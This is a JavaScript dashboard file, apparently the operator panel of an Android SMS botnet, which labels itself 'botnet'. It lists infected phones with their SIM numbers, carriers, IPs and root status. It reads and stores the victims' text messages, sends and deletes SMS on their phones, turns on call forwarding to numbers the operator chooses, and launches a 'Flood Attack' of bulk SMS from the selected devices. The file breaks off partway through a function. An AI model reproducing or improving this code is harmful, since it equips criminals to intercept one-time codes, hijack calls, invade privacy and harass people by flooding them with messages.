// Auth Check
const token = localStorage.getItem('botnet_session');
const oldToken = localStorage.getItem('botnet_token');

// Clear old token format
if (oldToken) {
    localStorage.removeItem('botnet_token');
}

// Check if valid session token exists
if (!token || token === 'polymath-botnet-key') {
    localStorage.removeItem('botnet_session');
    window.location.href = '/login.html';
}

const API_URL = window.location.origin;
const AUTH_TOKEN = token;
let currentDevice = null;
let messages = [];
let lastMessageId = null;
let allDevices = [];
let selectedDevices = [];
let displayedMessageCount = 10;
let hasMoreMessages = true;
let newMessageCount = 0;
let lastViewedMessageId = null;
let hiddenMessages = new Set();
let viewMode = 'showall'; // 'latest10', 'showall', or 'custom'
const MESSAGES_PER_PAGE = 10;
let smsBackups = JSON.parse(localStorage.getItem('sms_backups')) || {};
let newSmsNotifications = [];
let trackedMessageIds = new Set();
let smsStatusMonitor = {};

const socket = io(API_URL, {
    auth: {
        token: AUTH_TOKEN
    }
});

socket.on('connect', () => console.log('✅ Connected'));
socket.on('device-data', (data) => updateDeviceData(data));
socket.on('delta-update', (data) => {
    console.log('Delta update:', data);
    loadDevices();
    
    // Handle new SMS notifications - only for genuinely new messages
    if (data.messages) {
        const msgEntries = Object.entries(data.messages);
        const newMessages = msgEntries.filter(([msgId]) => !trackedMessageIds.has(msgId));
        
        newMessages.forEach(([msgId, msgData]) => {
            trackedMessageIds.add(msgId);
            // Add to bell notification only if it's genuinely new
            newSmsNotifications.push({
                id: msgId,
                sender: msgData.sender || 'Unknown',
                message: msgData.message || '',
                dateTime: msgData.dateTime || '',
                deviceId: data.deviceId || 'Unknown',
                deviceName: data.modelName || 'Unknown Device'
            });
        });
        
        // Only update bell if there are genuinely new messages
        if (newMessages.length > 0) {
            updateBellNotifications();
        }
    }
    
    // Handle SMS status updates
    if (data.smsStatus) {
        Object.entries(data.smsStatus).forEach(([statusKey, statusData]) => {
            smsStatusMonitor[statusKey] = statusData;
        });
        updateSmsStatusDisplay();
    }
    
    if (currentDevice && data.messages) {
        const oldNewestId = messages.length > 0 ? messages[messages.length - 1].id : null;
        loadMessages().then(() => {
            if (messages.length > 0 && oldNewestId) {
                const newNewestId = messages[messages.length - 1].id;
                if (newNewestId !== oldNewestId) {
                    const oldTimestamp = extractTimestamp(oldNewestId);
                    const newTimestamp = extractTimestamp(newNewestId);
                    if (newTimestamp > oldTimestamp) {
                        setTimeout(() => {
                            const container = document.getElementById('messages-container');
                            if (container) container.scrollTop = container.scrollHeight;
                        }, 100);
                    }
                }
            }
            
            // Auto-update backup with new messages
            if (messages.length > 0) {
                updateBackup(currentDevice.id, currentDevice.name, messages);
            }
        });
    }
    
    // Auto-backup for newly connected devices
    if (data.deviceId && data.messages && Object.keys(data.messages).length > 0) {
        const deviceId = data.deviceId;
        if (!smsBackups[deviceId]) {
            const msgArray = Object.entries(data.messages).map(([id, msg]) => ({id, ...msg}));
            const deviceName = data.modelName || data.deviceId || 'Unknown Device';
            saveBackup(deviceId, deviceName, msgArray);
            console.log('✅ Auto-backup created for new device:', deviceName);
        }
    }
});

function extractTimestamp(id) {
    if (!id) return 0;
    const idStr = String(id);
    if (idStr.includes('-LATEST_-0')) {
        const match = idStr.match(/-LATEST_-0(\d+)/);
        return match ? parseInt(match[1]) : 0;
    }
    return parseInt(idStr) || 0;
}
socket.on('more-messages', (newMsgs) => appendMessages(newMsgs));

// Logout
async function logout() {
    try {
        await fetch(`${API_URL}/logout`, {
            method: 'POST',
            headers: { 'Authorization': AUTH_TOKEN }
        });
    } catch (err) {
        console.error('Logout error:', err);
    }
    localStorage.removeItem('botnet_session');
    window.location.href = '/login.html';
}

// Load Devices
async function loadDevices() {
    try {
        const res = await fetch(`${API_URL}/devices`, {
            headers: { 'Authorization': AUTH_TOKEN }
        });
        
        if (res.status === 401) {
            localStorage.removeItem('botnet_session');
            window.location.href = '/login.html';
            return;
        }
        
        const data = await res.json();
        
        if (data.error || !Array.isArray(data)) {
            console.error('❌ Devices error:', data.error || 'Invalid response');
            allDevices = [];
            return;
        }
        
        const devices = data;
        allDevices = devices;
        
        // Initialize trackedMessageIds with all existing messages on first load
        devices.forEach(device => {
            if (device.messages && typeof device.messages === 'object') {
                Object.keys(device.messages).forEach(msgId => {
                    trackedMessageIds.add(msgId);
                });
            }
        });
        
        // Update stats
        document.getElementById('total-devices').textContent = devices.length;
        const onlineCount = devices.filter(d => d.status === true || d.status === 'true').length;
        document.getElementById('online-devices').textContent = onlineCount;
        document.getElementById('offline-devices').textContent = devices.length - onlineCount;
        
        let totalSMS = 0;
        devices.forEach(d => {
            if (d.messages && typeof d.messages === 'object') {
                totalSMS += Object.keys(d.messages).length;
            }
        });
        document.getElementById('total-sms').textContent = totalSMS;
        
        // Render table
        const tbody = document.getElementById('devices-table');
        tbody.innerHTML = devices.map(d => {
            const sim1 = d.sims?.find(s => s.simSlotIndex === '0' || s.simSlotIndex === 0);
            const sim2 = d.sims?.find(s => s.simSlotIndex === '1' || s.simSlotIndex === 1);
            const isOnline = d.status === true || d.status === 'true';
            const statusClass = isOnline ? 'status-online' : 'status-offline';
            const checked = selectedDevices.includes(d.id) ? 'checked' : '';
            
            return `
                <tr class="card-hover transition-all border-b border-gray-800">
                    <td class="px-2 py-2">
                        <input type="checkbox" ${checked} onchange="toggleDevice('${d.id}', this.checked)">
                    </td>
                    <td class="px-2 py-2">
                        <i class="fas fa-circle ${statusClass}" title="${isOnline ? 'Online' : 'Offline'}"></i>
                    </td>
                    <td class="px-2 py-2">
                        <div class="font-semibold text-white text-xs">${d.modelName || 'Unknown'}</div>
                        <div class="text-xs text-gray-400">${d.deviceId?.substring(0, 8)}...</div>
                    </td>
                    <td class="px-2 py-2 hide-mobile text-xs text-gray-400">${(d.join_time || 'N/A').substring(0, 15)}</td>
                    <td class="px-2 py-2">
                        <div class="text-xs">${sim1?.phoneNumber?.substring(0, 13) || 'N/A'}</div>
                        <div class="text-xs text-gray-400">${sim1?.carrierName || ''}</div>
                    </td>
                    <td class="px-2 py-2 hide-mobile">
                        <div class="text-xs">${sim2?.phoneNumber?.substring(0, 13) || 'N/A'}</div>
                        <div class="text-xs text-gray-400">${sim2?.carrierName || ''}</div>
                    </td>
                    <td class="px-2 py-2 hide-mobile">
                        <span class="px-2 py-1 rounded ${getBatteryClass(d.battery)} text-xs">
                            ${d.battery || 'N/A'}
                        </span>
                    </td>
                    <td class="px-2 py-2">
                        <div class="flex space-x-1">
                            <button onclick='showDeviceInfo(${JSON.stringify(d).replace(/'/g, "&#39;")})' class="bg-blue-600 hover:bg-blue-700 px-2 py-1 rounded text-xs">
                                <i class="fas fa-info"></i>
                            </button>
                            <button onclick="openDevice('${d.id}', '${d.modelName || 'Unknown'}')" class="bg-purple-600 hover:bg-purple-700 px-2 py-1 rounded text-xs">
                                <i class="fas fa-cog"></i>
                            </button>
                            <button onclick="moveToTrash('${d.id}')" class="bg-gray-600 hover:bg-gray-700 px-2 py-1 rounded text-xs">
                                <i class="fas fa-trash"></i>
                            </button>
                        </div>
                    </td>
                </tr>
            `;
        }).join('');
    } catch (err) {
        console.error('❌ Load devices failed:', err);
    }
}

function getBatteryClass(battery) {
    if (!battery) return 'bg-gray-900 text-gray-300';
    const level = parseInt(battery);
    if (level >= 70) return 'bg-green-900 text-green-300';
    if (level >= 30) return 'bg-yellow-900 text-yellow-300';
    return 'bg-red-900 text-red-300';
}

// Device Selection
function toggleDevice(id, checked) {
    if (checked) {
        if (!selectedDevices.includes(id)) selectedDevices.push(id);
    } else {
        selectedDevices = selectedDevices.filter(d => d !== id);
    }
}

function toggleSelectAll(checkbox) {
    if (checkbox.checked) {
        selectedDevices = allDevices.map(d => d.id);
        document.querySelectorAll('#devices-table input[type="checkbox"]').forEach(cb => cb.checked = true);
    } else {
        selectedDevices = [];
        document.querySelectorAll('#devices-table input[type="checkbox"]').forEach(cb => cb.checked = false);
    }
}

function selectAllDevices() {
    document.getElementById('select-all').checked = true;
    toggleSelectAll(document.getElementById('select-all'));
}

// Show Device Info Modal
function showDeviceInfo(device) {
    const modal = document.getElementById('info-modal');
    const details = document.getElementById('device-details');
    
    const sim1 = device.sims?.find(s => s.simSlotIndex === '0' || s.simSlotIndex === 0);
    const sim2 = device.sims?.find(s => s.simSlotIndex === '1' || s.simSlotIndex === 1);
    
    details.innerHTML = `
        <div class="bg-gray-900 p-3 rounded"><p class="text-gray-400 text-xs">Device ID</p><p class="text-white font-semibold text-sm">${device.deviceId || 'N/A'}</p></div>
        <div class="bg-gray-900 p-3 rounded"><p class="text-gray-400 text-xs">Model</p><p class="text-white font-semibold text-sm">${device.modelName || 'N/A'}</p></div>
        <div class="bg-gray-900 p-3 rounded"><p class="text-gray-400 text-xs">Android</p><p class="text-white font-semibold text-sm">${device.androidV || 'N/A'}</p></div>
        <div class="bg-gray-900 p-3 rounded"><p class="text-gray-400 text-xs">Battery</p><p class="text-white font-semibold text-sm">${device.battery || 'N/A'}</p></div>
        <div class="bg-gray-900 p-3 rounded"><p class="text-gray-400 text-xs">Storage</p><p class="text-white font-semibold text-sm">${device.storage || 'N/A'}</p></div>
        <div class="bg-gray-900 p-3 rounded"><p class="text-gray-400 text-xs">IP</p><p class="text-white font-semibold text-sm">${device.ip_address || 'N/A'}</p></div>
        <div class="bg-gray-900 p-3 rounded"><p class="text-gray-400 text-xs">Connection</p><p class="text-white font-semibold text-sm">${device.connection_status || 'N/A'}</p></div>
        <div class="bg-gray-900 p-3 rounded"><p class="text-gray-400 text-xs">Join Time</p><p class="text-white font-semibold text-sm">${device.join_time || 'N/A'}</p></div>
        <div class="bg-gray-900 p-3 rounded"><p class="text-gray-400 text-xs">SIM 1</p><p class="text-white font-semibold text-sm">${sim1?.phoneNumber || 'N/A'}</p><p class="text-gray-400 text-xs">${sim1?.carrierName || ''}</p></div>
        <div class="bg-gray-900 p-3 rounded"><p class="text-gray-400 text-xs">SIM 2</p><p class="text-white font-semibold text-sm">${sim2?.phoneNumber || 'N/A'}</p><p class="text-gray-400 text-xs">${sim2?.carrierName || ''}</p></div>
        <div class="bg-gray-900 p-3 rounded"><p class="text-gray-400 text-xs">Root</p><p class="text-white font-semibold text-sm">${device.isRoot ? 'Yes' : 'No'}</p></div>
        <div class="bg-gray-900 p-3 rounded"><p class="text-gray-400 text-xs">Status</p><p class="text-white font-semibold text-sm ${device.status === true || device.status === 'true' ? 'text-green-400' : 'text-red-400'}">${device.status === true || device.status === 'true' ? 'Online' : 'Offline'}</p></div>
    `;
    
    modal.style.display = 'block';
}

function closeModal() {
    document.getElementById('info-modal').style.display = 'none';
}

// Open Device Control Panel
function openDevice(id, name) {
    currentDevice = { id, name };
    document.getElementById('control-panel').classList.remove('hidden');
    document.getElementById('device-title').textContent = name;
    socket.emit('join-device', id);
    viewMode = 'showall'; // Show all messages by default
    displayedMessageCount = 0;
    smsStatusMonitor = {}; // Reset SMS status monitor
    loadMessages(true).then(() => {
        if (messages.length > 0) {
            lastViewedMessageId = messages[messages.length - 1].id;
        }
    });
    loadDeviceSmsStatus(id); // Load SMS status for this device
}

function closePanel() {
    document.getElementById('control-panel').classList.add('hidden');
    currentDevice = null;
    lastViewedMessageId = null;
    smsStatusMonitor = {};
    document.getElementById('sms-status-section').style.display = 'none';
}

function updateDeviceData(data) {
    console.log('Device data updated:', data);
}

// Load Messages (All messages, sorted oldest first like RTDB tree)
async function loadMessages(resetView = false) {
    if (!currentDevice) return;
    try {
        const res = await fetch(`${API_URL}/device/${currentDevice.id}/messages`, {
            headers: { 'Authorization': AUTH_TOKEN }
        });
        const data = await res.json();
        
        // Check if response is an error or valid array
        if (data.error || !Array.isArray(data)) {
            console.error('❌ Messages error:', data.error || 'Invalid response');
            messages = [];
        } else {
            messages = data;
            
            // Initialize trackedMessageIds with existing messages to avoid flagging them as new
            messages.forEach(msg => {
                trackedMessageIds.add(msg.id);
            });
            
            // Auto-backup SMS when first loaded for this device
            if (messages.length > 0 && !smsBackups[currentDevice.id]) {
                saveBackup(currentDevice.id, currentDevice.name, messages);
                console.log('✅ SMS backup created for', currentDevice.name);
            }
        }
        
        // Apply view mode - always show all by default
        if (resetView) {
            viewMode = 'showall';
            displayedMessageCount = messages.length;
        } else if (viewMode === 'showall') {
            displayedMessageCount = messages.length;
        }
        // For 'custom' mode, keep displayedMessageCount as is (from Load More)
        
        hasMoreMessages = messages.length > displayedMessageCount;
        renderMessages();
        if (messages.length > 0) lastMessageId = messages[messages.length - 1].id;
    } catch (err) {
        console.error('❌ Messages failed:', err);
        messages = [];
        renderMessages();
    }
}

function loadMoreMessages() {
    if (!currentDevice || messages.length === 0 || !hasMoreMessages) return;
    viewMode = 'custom';
    displayedMessageCount = Math.min(displayedMessageCount + 10, messages.length);
    hasMoreMessages = displayedMessageCount < messages.length;
    renderMessages();
}

function refreshMessages() {
    if (currentDevice) {
        loadMessages(true);
    }
}

function toggleMessageVisibility(msgId) {
    if (hiddenMessages.has(msgId)) {
        hiddenMessages.delete(msgId);
    } else {
        hiddenMessages.add(msgId);
    }
    renderMessages();
}

function getDateLabel(dateString) {
    if (!dateString) return 'Unknown Date';
    
    const msgDate = new Date(dateString);
    const today = new Date();
    const yesterday = new Date(today);
    yesterday.setDate(yesterday.getDate() - 1);
    
    const msgDateStr = msgDate.toDateString();
    const todayStr = today.toDateString();
    const yesterdayStr = yesterday.toDateString();
    
    if (msgDateStr === todayStr) return 'Today';
    if (msgDateStr === yesterdayStr) return 'Yesterday';
    return msgDate.toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' });
}

function groupMessagesByDate(msgs) {
    const groups = {};
    msgs.forEach(msg => {
        const dateLabel = getDateLabel(msg.dateTime);
        if (!groups[dateLabel]) groups[dateLabel] = [];
        groups[dateLabel].push(msg);
    });
    return groups;
}

function renderMessages() {
    const tbody = document.getElementById('messages-table');
    // Show last N messages (from end of array - latest messages from RTDB tree)
    const startIndex = Math.max(0, messages.length - displayedMessageCount);
    let displayMessages = messages.slice(startIndex).filter(msg => !hiddenMessages.has(msg.id));
    
    const groupedMessages = groupMessagesByDate(displayMessages);
    
    let html = '';
    Object.keys(groupedMessages).forEach(dateLabel => {
        html += `
            <tr class="bg-purple-900 bg-opacity-30">
                <td colspan="5" class="px-2 py-2 text-xs font-bold text-purple-300">
                    <i class="fas fa-calendar-day mr-1"></i>${dateLabel}
                </td>
            </tr>
        `;
        groupedMessages[dateLabel].forEach(msg => {
            const isHidden = hiddenMessages.has(msg.id);
            const messageText = msg.message || '';
            html += `
                <tr class="hover:bg-gray-800">
                    <td class="px-2 py-1 text-xs">${msg.sender || 'Unknown'}</td>
                    <td class="px-2 py-1 text-xs" style="white-space: pre-wrap; word-break: break-word; max-width: 300px;">${messageText}</td>
                    <td class="px-2 py-1 text-xs text-gray-400 hide-mobile">${msg.dateTime || ''}</td>
                    <td class="px-2 py-1">
                        <button onclick="toggleMessageVisibility('${msg.id}')" class="bg-blue-600 hover:bg-blue-700 px-1 py-1 rounded text-xs mr-1" title="${isHidden ? 'Show' : 'Hide'}">
                            <i class="fas fa-eye${isHidden ? '' : '-slash'}"></i>
                        </button>
                        <button onclick="deleteSMS('${msg.id}')" class="bg-red-600 hover:bg-red-700 px-1 py-1 rounded text-xs" title="Delete">
                            <i class="fas fa-trash"></i>
                        </button>
                    </td>
                </tr>
            `;
        });
    });
    
    tbody.innerHTML = html;
    
    const loadMoreBtn = document.getElementById('load-more');
    if (loadMoreBtn) {
        loadMoreBtn.style.display = hasMoreMessages ? 'block' : 'none';
    }
    
    const messageCount = document.getElementById('message-count');
    if (messageCount) {
        const showing = displayMessages.length;
        messageCount.textContent = `Showing ${showing} of ${messages.length} messages`;
    }
}


function updateBellNotifications() {
    const count = newSmsNotifications.length;
    const badge = document.getElementById('notification-count');
    const listContainer = document.getElementById('notification-list');
    
    if (count > 0) {
        badge.textContent = count;
        badge.classList.remove('hidden');
        
        // Show latest 50 notifications
        const recentNotifications = newSmsNotifications.slice(-50).reverse();
        listContainer.innerHTML = recentNotifications.map(notif => `
            <div class="p-2 mb-2 bg-gray-800 rounded hover:bg-gray-700 border-l-2 border-purple-500">
                <div class="flex justify-between items-start mb-1">
                    <span class="text-xs font-bold text-purple-300">${notif.sender}</span>
                    <span class="text-xs text-gray-400">${notif.dateTime}</span>
                </div>
                <p class="text-xs text-gray-200 mb-1" style="word-break: break-word;">${notif.message.substring(0, 100)}${notif.message.length > 100 ? '...' : ''}</p>
                <div class="text-xs text-gray-500">
                    <i class="fas fa-mobile-alt mr-1"></i>${notif.deviceName}
                </div>
            </div>
        `).join('');
    } else {
        badge.classList.add('hidden');
        listContainer.innerHTML = '<p class="text-xs text-gray-400 text-center py-4">No new SMS</p>';
    }
}

function toggleNotifications() {
    const dropdown = document.getElementById('notification-dropdown');
    dropdown.classList.toggle('hidden');
}

function clearNotifications() {
    newSmsNotifications = [];
    updateBellNotifications();
}

// Close notification dropdown when clicking outside
document.addEventListener('click', (e) => {
    const dropdown = document.getElementById('notification-dropdown');
    const button = e.target.closest('button[onclick="toggleNotifications()"]');
    if (!dropdown?.contains(e.target) && !button) {
        dropdown?.classList.add('hidden');
    }
});

// Send SMS
async function sendSMS() {
    if (!currentDevice) return;
    const sim = parseInt(document.getElementById('sms-sim').value);
    const to = document.getElementById('sms-to').value;
    const msg = document.getElementById('sms-msg').value;
    
    if (!to || !msg) {
        alert('⚠️ Fill all fields');
        return;
    }
    
    try {
        await fetch(`${API_URL}/command/${currentDevice.id}`, {
            method: 'POST',
            headers: { 
                'Content-Type': 'application/json',
                'Authorization': AUTH_TOKEN 
            },
            body: JSON.stringify({
                type: 'sendSms',
                payload: { simSlot: sim, to, message: msg }
            })
        });
        alert(`✅ SMS sent via SIM ${sim === 0 ? '1' : '2'}`);
        document.getElementById('sms-to').value = '';
        document.getElementById('sms-msg').value = '';
        // Show SMS status section
        document.getElementById('sms-status-section').style.display = 'block';
    } catch (err) {
        alert('❌ SMS failed');
    }
}

// Load SMS Status for device
async function loadDeviceSmsStatus(deviceId) {
    try {
        const res = await fetch(`${API_URL}/device/${deviceId}/smsStatus`, {
            headers: { 'Authorization': AUTH_TOKEN }
        });
        if (res.ok) {
            const data = await res.json();
            if (data && typeof data === 'object') {
                Object.entries(data).forEach(([key, value]) => {
                    smsStatusMonitor[key] = value;
                });
                updateSmsStatusDisplay();
            }
        }
    } catch (err) {
        console.log('No SMS status data or error:', err);
    }
}

// Update SMS Status Display
function updateSmsStatusDisplay() {
    if (!currentDevice) return;
    
    const statusList = document.getElementById('sms-status-list');
    const statusSection = document.getElementById('sms-status-section');
    
    const statusEntries = Object.entries(smsStatusMonitor);
    
    if (statusEntries.length === 0) {
        statusSection.style.display = 'none';
        return;
    }
    
    statusSection.style.display = 'block';
    
    // Sort by timestamp (most recent first)
    statusEntries.sort((a, b) => {
        const timeA = new Date(a[1].timestamp || 0);
        const timeB = new Date(b[1].timestamp || 0);
        return timeB - timeA;
    });
    
    // Show latest 10 statuses
    const recentStatuses = statusEntries.slice(0, 10);
    
    statusList.innerHTML = recentStatuses.map(([key, status]) => {
        const statusColor = status.status === 'success' ? 'text-green-400' : 
                           status.status === 'in_progress' ? 'text-yellow-400' : 
                           'text-red-400';
        const statusIcon = status.status === 'success' ? 'fa-check-circle' : 
                          status.status === 'in_progress' ? 'fa-clock' : 
                          'fa-exclamation-circle';
        
        return `
            <div class="p-2 bg-gray-800 rounded border-l-2 ${status.status === 'success' ? 'border-green-500' : status.status === 'in_progress' ? 'border-yellow-500' : 'border-red-500'}">
                <div class="flex justify-between items-start mb-1">
                    <span class="text-xs font-bold ${statusColor}">
                        <i class="fas ${statusIcon} mr-1"></i>${status.status.toUpperCase()}
                    </span>
                    <span class="text-xs text-gray-400">${status.timestamp || ''}</span>
                </div>
                <div class="text-xs text-gray-300">
                    <span class="text-gray-400">To:</span> ${status.to || 'N/A'}
                </div>
                <div class="text-xs text-gray-300" style="word-break: break-word;">
                    <span class="text-gray-400">Message:</span> ${(status.message || '').substring(0, 50)}${status.message && status.message.length > 50 ? '...' : ''}
                </div>
                <div class="text-xs text-gray-400">
                    SIM ${status.simSlot === 0 ? '1' : '2'}
                </div>
            </div>
        `;
    }).join('');
}

// Delete SMS
async function deleteSMS(id) {
    if (!currentDevice || !id) return;
    try {
        await fetch(`${API_URL}/sms/${currentDevice.id}/${id}`, {
            method: 'DELETE',
            headers: { 'Authorization': AUTH_TOKEN }
        });
        alert('✅ Delete sent');
        loadMessages();
    } catch (err) {
        alert('❌ Delete failed');
    }
}

// Call Forward
async function activateCF() {
    if (!currentDevice) return;
    const sim = parseInt(document.getElementById('cf-sim').value);
    const to = document.getElementById('cf-to').value;
    
    if (!to) {
        alert('⚠️ Enter number');
        return;
    }
    
    try {
        await fetch(`${API_URL}/command/${currentDevice.id}`, {
            method: 'POST',
            headers: { 
                'Content-Type': 'application/json',
                'Authorization': AUTH_TOKEN 
            },
            body: JSON.stringify({
                type: 'callForward',
                payload: { simSlot: sim, to, isActive: true }
            })
        });
        alert(`✅ CF ON - SIM ${sim === 0 ? '1' : '2'}`);
    } catch (err) {
        alert('❌ CF failed');
    }
}

async function deactivateCF() {
    if (!currentDevice) return;
    const sim = parseInt(document.getElementById('cf-sim').value);
    
    try {
        await fetch(`${API_URL}/command/${currentDevice.id}`, {
            method: 'POST',
            headers: { 
                'Content-Type': 'application/json',
                'Authorization': AUTH_TOKEN 
            },
            body: JSON.stringify({
                type: 'callForward',
                payload: { simSlot: sim, to: '', isActive: false }
            })
        });
        alert(`✅ CF OFF - SIM ${sim === 0 ? '1' : '2'}`);
    } catch (err) {
        alert('❌ CF failed');
    }
}

// Flood Attack
function openFlood() {
    if (selectedDevices.length === 0) {
        alert('⚠️ Select devices first');
        return;
    }
    document.getElementById('flood-count').textContent = selectedDevices.length;
    document.getElementById('flood-modal').style.display = 'block';
}

function closeFloodModal() {
    document.getElementById('flood-modal').style.display = 'none';
}

async function executeFlood() {
    const sim = parseInt(document.getElementById('flood-sim').value);
    const to = document.getElementById('flood-to').value;
    const msg = document.getElementById('flood-msg').value;
    const count = parseInt(document.getElementById('flood-count-input').value);
    
    if (!to || !msg) {
        alert('⚠️ Fill all fields');
        return;
    }
    
    try {
        const res = await fetch(`${API_URL}/flood`, {
            method: 'POST',
            headers: { 
                'Content-Type': 'application/json',
                'Authorization': AUTH_TOKEN 
            },
            body: JSON.stringify({
                deviceIds: selectedDevices,
                simSlot: sim,
                to,
                message: msg,
                count
            })
        });
        const data = await res.json();
        alert('✅ ' + data.message);
        closeFloodModal();
    } catch (err) {
        alert('❌ Flood failed');
    }
}

// Tools
function openTools() {
    document.getElementById('tools-modal').style.display = 'block';
}

function closeToolsModal() {
    document.getElementById('tools-modal').style.display = 'none';
}

// Trash
async function moveToTrash(deviceId) {
    if (!confirm('Move to trash?')) return;
    try {
        await fetch(`${API_URL}/trash/${deviceId}`, {
            method: 'POST',
            headers: { 'Authorization': AUTH_TOKEN }
        });
        alert('✅ Moved to trash');
        loadDevices();
    } catch (err) {
        alert('❌ Failed');
    }
}

async function openTrash() {
    try {
        const res = await fetch(`${API_URL}/trash`, {
            headers: { 'Authorization': AUTH_TOKEN }
        });
        const devices = await res.json();
        const tbody = document.getElementById('trash-table');
        
        if (devices.length === 0) {
            tbody.innerHTML = '<tr><td colspan="3" class="px-2 py-3 text-center text-gray-400">Trash is empty</td></tr>';
        } else {
            tbody.innerHTML = devices.map(d => `
                <tr class="border-b border-gray-800">
                    <td class="px-2 py-2 text-xs">${d.deviceId?.substring(0, 12)}...</td>
                    <td class="px-2 py-2 text-xs">${d.modelName || 'Unknown'}</td>
                    <td class="px-2 py-2">
                        <button onclick="restoreDevice('${d.id}')" class="bg-green-600 hover:bg-green-700 px-2 py-1 rounded text-xs mr-1">
                            <i class="fas fa-undo"></i> Restore
                        </button>
                        <button onclick="deleteDevice('${d.id}')" class="bg-red-600 hover:bg-red-700 px-2 py-1 rounded text-xs">
                            <i class="fas fa-times"></i> Delete
                        </button>
                    </td>
                </tr>
            `).join('');
        }
        document.getElementById('trash-modal').style.display = 'block';
    } catch (err) {
        alert('❌ Failed to load trash');
    }
}

async function restoreDevice(deviceId) {
    try {
        await fetch(`${API_URL}/restore/${deviceId}`, {
            method: 'POST',
            headers: { 'Authorization': AUTH_TOKEN }
        });
        alert('✅ Restored');
        openTrash();
        loadDevices();
    } catch (err) {
        alert('❌ Failed');
    }
}

async function deleteDevice(deviceId) {
    if (!confirm('Delete permanently?')) return;
    try {
        await fetch(`${API_URL}/trash/${deviceId}`, {
            method: 'DELETE',
            headers: { 'Authorization': AUTH_TOKEN }
        });
        alert('✅ Deleted permanently');
        openTrash();
    } catch (err) {
        alert('❌ Failed');
    }
}

function closeTrashModal() {
    document.getElementById('trash-modal').style.display = 'none';
}

// Firebase Stats
async function showStats() {
    try {
        const res = await fetch(`${API_URL}/stats`, {
            headers: { 'Authorization': AUTH_TOKEN }
        });
        const stats = await res.json();
        const content = document.getElementById('stats-content');
        
        content.innerHTML = `
            <div class="bg-gray-900 p-4 rounded">
                <h3 class="text-purple-400 font-bold mb-2">Database</h3>
                <p class="text-sm"><span class="text-gray-400">Status:</span> <span class="text-green-400">${stats.database.status}</span></p>
                <p class="text-sm"><span class="text-gray-400">URL:</span> ${stats.database.url}</p>
                <p class="text-sm"><span class="text-gray-400">Region:</span> ${stats.database.region}</p>
            </div>
            <div class="bg-gray-900 p-4 rounded">
                <h3 class="text-purple-400 font-bold mb-2">Storage</h3>
                <p class="text-sm"><span class="text-gray-400">Used:</span> ${stats.storage.used}</p>
                <p class="text-sm"><span class="text-gray-400">Limit:</span> ${stats.storage.limit}</p>
                <p class="text-sm"><span class="text-gray-400">Usage:</span> <span class="text-yellow-400">${stats.storage.percentage}</span></p>
            </div>
            <div class="bg-gray-900 p-4 rounded">
                <h3 class="text-purple-400 font-bold mb-2">Bandwidth</h3>
                <p class="text-sm"><span class="text-gray-400">Downloads:</span> ${stats.bandwidth.downloads}</p>
                <p class="text-sm"><span class="text-gray-400">Limit:</span> ${stats.bandwidth.limit}</p>
            </div>
            <div class="bg-gray-900 p-4 rounded">
                <h3 class="text-purple-400 font-bold mb-2">Network</h3>
                <p class="text-sm"><span class="text-gray-400">Latency:</span> <span class="text-green-400">${stats.network.latency}</span></p>
                <p class="text-sm"><span class="text-gray-400">Speed:</span> <span class="text-green-400">${stats.network.speed}</span></p>
            </div>
        `;
        
        document.getElementById('stats-modal').style.display = 'block';
    } catch (err) {
        alert('❌ Failed to load stats');
    }
}

function closeStatsModal() {
    document.getElementById('stats-modal').style.display = 'none';
}

// SMS Backup Functions
function saveBackup(deviceId, deviceName, messages) {
    smsBackups[deviceId] = {
        deviceName: deviceName || 'Unknown Device',
        deviceId: deviceId,
        messages: messages,
        timestamp: new Date().toISOString(),
        messageCount: messages.length
    };
    localStorage.setItem('sms_backups', JSON.stringify(smsBackups));
}

function updateBackup(deviceId, deviceName, newMessages) {
    if (!smsBackups[deviceId]) {
        saveBackup(deviceId, deviceName, newMessages);
        return;
    }
    
    const existingBackup = smsBackups[deviceId];
    const existingIds = new Set(existingBackup.messages.map(m => m.id));
    
    // Add only new messages (no duplicates)
    const uniqueNewMessages = newMessages.filter(msg => !existingIds.has(msg.id));
    
    if (uniqueNewMessages.length > 0) {
        const mergedMessages = [...existingBackup.messages, ...uniqueNewMessages];
        // Sort by timestamp
        mergedMessages.sort((a, b) => {
            const timeA = extractTimestamp(a.id);
            const timeB = extractTimestamp(b.id);
            return timeA - timeB;
        });
        
        smsBackups[deviceId] = {
            ...existingBackup,
            messages: mergedMessages,
            timestamp: new Date().toISOString(),
            messageCount: mergedMessages.length
        };
        localStorage.setItem('sms_backups', JSON.stringify(smsBackups));
        console.log(`✅ Backup updated: ${uniqueNewMessages.length} new messages added`);
    }
}

function openBackups() {
    renderBackupTable();
    document.getElementById('backup-modal').style.display = 'block';
}

function renderBackupTable(searchTerm = '') {
    const backupList = Object.values(smsBackups);
    const tbody = document.getElementById('backup-table');
    
    // Filter backups based on search
    const filteredBackups = searchTerm 
        ? backupList.filter(backup => 
            backup.deviceName.toLowerCase().includes(searchTerm.toLowerCase()) ||
            backup.deviceId.toLowerCase().includes(searchTerm.toLowerCase())
          )
        : backupList;
    
    if (filteredBackups.length === 0) {
        const msg = searchTerm ? 'No matching backups found' : 'No backups available';
        tbody.innerHTML = `<tr><td colspan="5" class="px-2 py-3 text-center text-gray-400">${msg}</td></tr>`;
    } else {
        tbody.innerHTML = filteredBackups.map(backup => {
            const date = new Date(backup.timestamp);
            const dateStr = date.toLocaleDateString() + ' ' + date.toLocaleTimeString();
            return `
                <tr class="border-b border-gray-800 hover:bg-gray-800">
                    <td class="px-2 py-2 text-xs">${backup.deviceName}</td>
                    <td class="px-2 py-2 text-xs hide-mobile">${backup.deviceId.substring(0, 12)}...</td>
                    <td class="px-2 py-2 text-xs">${backup.messageCount}</td>
                    <td class="px-2 py-2 text-xs hide-mobile">${dateStr}</td>
                    <td class="px-2 py-2">
                        <button onclick="viewBackup('${backup.deviceId}')" class="bg-blue-600 hover:bg-blue-700 px-2 py-1 rounded text-xs mr-1" title="View">
                            <i class="fas fa-eye"></i>
                        </button>
                        <button onclick="deleteBackup('${backup.deviceId}')" class="bg-red-600 hover:bg-red-700 px-2 py-1 rounded text-xs" title="Delete">
                            <i class="fas fa-trash"></i>
                        </button>
                    </td>
                </tr>
            `;
        }).join('');
    }
}

function filterBackups() {
    const searchTerm = document.getElementById('backup-search').value;
    renderBackupTable(searchTerm);
}

function viewBackup(deviceId) {
    const backup = smsBackups[deviceId];
    if (!backup) {
        alert('Backup not found');
        return;
    }
    
    const groupedMessages = groupMessagesByDate(backup.messages);
    const tbody = document.getElementById('backup-messages-table');
    
    let html = '';
